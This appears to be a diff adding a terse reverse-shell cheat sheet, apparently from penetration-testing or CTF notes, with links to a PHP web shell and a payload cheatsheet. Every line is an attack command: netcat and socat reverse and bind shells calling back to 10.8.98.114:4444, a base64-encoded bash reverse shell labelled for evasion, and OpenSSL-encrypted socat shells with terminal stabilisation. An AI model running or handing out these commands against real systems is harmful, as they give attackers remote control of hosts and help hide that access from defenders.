@@ -1,0 +1,38 @@
+### rshell ###
+https://raw.githubusercontent.com/flozz/p0wny-shell/master/shell.php
+https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md
+
+# rshell
+nc 10.8.98.114 4444 -e /bin/sh
+# bshell
+nc -nvlp 4444 -e /bin/sh
+# listen
+nc -nvlp 4444
+rlwrap nc -lvnp 4444						# enhanced netcat
+ncat -nlvp 4444							# improved nc by nmap
+ncat --ssl -nlvp 4444						# allow ssl
+
+# evade
+echo YmFzaCAgLWkgPiYgL2Rldi90Y3AvMTAuOC45OC4xMTQvNDQ0NCAwPiYxCg== > /tmp/b64
+cat /tmp/b64 | base64 -d | bash
+
+# rshell
+socat TCP:10.8.98.114:4444 EXEC:"bash -li"
+# bshell
+socat TCP-L:4444 EXEC:"bash -li"
+# listen
+socat TCP-L:4444 -
+# fully stab
+socat TCP-L:4444 FILE:`tty`,raw,echo=0
+socat TCP:10.8.98.114:4444 EXEC:"bash -li",pty,stderr,sigint,setsid,sane
+
+# encrypted
+openssl req --newkey rsa:2048 -nodes -keyout shell.key -x509 -days 362 -out shell.crt
+cat shell.key shell.crt > shell.pem
+socat OPENSSL-LISTEN:4444,cert=shell.pem,verify=0 -
+socat OPENSSL:10.8.98.114:4444,verify=0 EXEC:/bin/bash
+# encrypted fully stab
+socat OPENSSL-LISTEN:4444,cert=shell.pem,verify=0 FILE:`tty`,raw,echo=0
+socat OPENSSL:10.8.98.114:4444,verify=0 EXEC:"bash -li",pty,stderr,sigint,setsid,sane
+
+
